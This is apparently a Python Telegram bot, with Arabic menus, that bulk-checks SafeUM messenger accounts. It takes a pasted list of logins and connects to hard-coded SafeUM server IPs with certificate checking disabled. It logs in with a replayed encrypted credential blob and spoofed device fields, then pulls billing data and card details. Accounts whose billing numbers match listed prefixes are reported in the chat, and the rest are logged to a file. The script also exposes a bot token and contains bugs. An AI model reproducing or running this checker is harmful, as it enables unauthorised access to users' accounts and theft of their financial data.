
from telebot import types
import telebot
import json
import ssl
import gzip
import websocket
import time

token = "7905440439:AAGx6F7iEYMJeKkuGqeKoHbQ000MF2zKTmc"
bot = telebot.TeleBot(token)

users = "" 

@bot.message_handler(commands=['start'])
def s1(message):
    id = message.from_user.id
    z = types.InlineKeyboardButton(text="بدا فحص", callback_data="s")
    k=types.InlineKeyboardButton(text="مطور بوت",url="http://t.me/yzzyyzy")
    j=types.InlineKeyboardButton(text="مبرمج اداة فحص",url="http://t.me/alikwiq")
    x = types.InlineKeyboardMarkup(row_width=1)
    x.add(z,k,j)
    bot.reply_to(message, """
    اهلا بك في بوت فحص حسابات سافيوم ائخي
    
    """, reply_markup=x)
#علي
@bot.callback_query_handler(func=lambda call: True)
def xx(call):
    if call.data == "s":
        bot.edit_message_text(chat_id=call.message.chat.id,
                              message_id=call.message.id,
                              text="دز حسابات هيج (ادخل الحسابات في الرسالة التالية)")
        bot.register_next_step_handler(call.message, get_accounts)  

def get_accounts(message):
    global users
    users = message.text  
    account_list = users.splitlines()  

    bot.reply_to(message, f"تم استلام {len(account_list)} حسابات. سيتم البدء في الفحص. , ")

    
    for user in users:
        if user.strip() != "":
            send_data_thread(user)


blist = [
    {"action": "Profile", "subaction": "GetStatus", "id": "2078941366"},
    {"action": "Profile", "subaction": "GetAvatar", "id": "2078941367"},
    {"action": "Devices", "subaction": "SetPushUId", "pushuid": "*epGgiFFeSg2sxg2uzlqiMd:APA91bFNWtNdleljmYAf9sJPfE-EOWSuAnacf8OoUDgTGcBh9bu90JcVtVpjQyuD3ZVcFBmu3qw6LvaN2yqYpwnX_arO074j-TncaYSj1CFTMd_AQLfpp9OVzO1fI-BPBsh2Psey59WY", "id": "2078941368"},
    {"action": "Profile", "subaction": "GetAvatar", "id": "2078941369"},
    {"action": "Profile", "subaction": "GetStatusMessage", "id": "2078941370"},
    {"action": "Security", "subaction": "Get", "id": "2078941371"},
    {"action": "Profile", "subaction": "Get", "id": "2078941372"},
    {"action": "Profile", "subaction": "GetStatus", "id": "2078941373"},
    {"action": "Devices", "subaction": "Get", "id": "2078941374"},
    {"action": "Crypto", "subaction": "IsExists", "id": "2078941375"},
    {"action": "Devices", "subaction": "SoftwareMinMax", "os": "AND", "id": "2078941376"},
    {"action": "Security", "subaction": "GetBillingData", "id": "2078941377"},
    {"action": "Crypto", "subaction": "IsExists", "id": "2078941378"},
    {"action": "Security", "subaction": "GetCards", "id": "2078941379"}
    
    
]

server = ["193.200.173.45", "185.65.206.12", "195.13.182.217", "195.13.182.213", "180.210.203.183"]
numbers = """371211
371212
371213
371214
371218
371222""".split("\n")

def send_data(user, server_name, num):
    url = f"wss://{server_name}:8080/Auth"
    headers = {
        "app": "com.safeum.android",
        "remoteIp": f"{server_name}",
        "remotePort": "8080",
        "sessionId": "b6cbb22d-06ca-41ff-8fda-c0ddeb148195",
        "time": "2024-07-07 12:12:12",
        "url": "wss://51.79.208.190/Auth"
    }

    data1 = {
        "action": "Login",
        "subaction": "GetKeyUnique",
        "deviceuid": "a64d8fdcc679de1f",
        "softwareversion": "1.1.0.2300",
        "id": "2078941362"
    }

    data2 = {
        "action": "Login",
        "subaction": "GetAuthData",
        "deviceuid": "a64d8fdcc679de1f",
        "softwareversion": "1.1.0.2300",
        "login": user,
        "id": "2078941363"
    }

    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    try:
        ws = websocket.create_connection(url, header=headers, sslopt={"cert_reqs": ssl.CERT_NONE})

        ws.send(json.dumps(data1))
        ws.send(json.dumps(data2))
        response = ws.recv()
        response = gzip.decompress(response)  # Decompress the response
        print(response)
        data2 = json.loads(response)["key"]
        response = ws.recv()
        response = gzip.decompress(response)
        print(response)
        response = ws.recv()
        response = gzip.decompress(response)
        print(response)

        ws.send(json.dumps({
            "action": "Login",
            "subaction": "Login",
            "deviceuid": "a64d8fdcc679de1f",
            "softwareversion": "1.1.0.2300",
            "pub": data2,
            "locale": "en_US",
            "gmt": "+03",
            "password": {
                "m1x": "9c72990bcfd144ec271fd6ac979f95c508baf8afd596ef462a607dcbf3e4ebc5",
                "m1y": "39ae788b788e5763e65759ddc3c45d5863a496dbbff0a316d5b59038d8b90685",
                "m2": "9d3e859c977eba30a4b52744d1eb6b5b69386de1febf5c84697304f0e519eb6a",
                "iv": "cf1bcad8b147cfb10c14e6140bb25b4b",
                "message": "61f40f8dc64d6b11abeadb1701f1fdf98a7629d270c54aaf5ccbfc63d4419ea96a39a1eb59c39bbcb24d1ae249b5a664d42f90a9d4f262c5161ce4ba65d71a02f0a78e1d6fbafa4d02bd0d7d80199133"
            },
            "login": user,
            "devicename": "Xiaomi Redmi Note 9S",
            "os": "AND",
            "devicepushuid": "*epGgiFFeSg2sxg2uzlqiMd:APA91bFNWtNdleljmYAf9sJPfE-EOWSuAnacf8OoUDgTGcBh9bu90JcVtVpjQyuD3ZVcFBmu3qw6LvaN2yqYpwnX_arO074j-TncaYSj1CFTMd_AQLfpp9OVzO1fI-BPBsh2Psey59WY",
            "osversion": "and_12.0.0",
            "id": "2078941364"
        }))
        response = ws.recv()
        response = gzip.decompress(response)
        print(response)

        for a in blist:
            ws.send(json.dumps(a))

        for _ in range(11):
            response = ws.recv()
            decompressed_response = gzip.decompress(response)
            print(decompressed_response)
            if "billingData" in json.loads(decompressed_response):
                number = str(json.loads(decompressed_response)["billingData"]['inum'])
                if str(number[:6]) in numbers:
                    bot.reply_to(message, f"تم فحص حساب {user}\n {number}")
                    return 0
                with open("other.txt", "a") as f:
                    f.write(f"\n{user}  {number}")
    except Exception as e:
        if num >= 10:#علي
            return 0
        num += 1
        server_name = server[round(num / 2) - 1]
        send_data(user, server_name, num)

def send_data_thread(user):
    send_data(user, server[0], 1)

bot.infinity_polling()#By : S1 # Ali اخخخخخ تباً للخماطين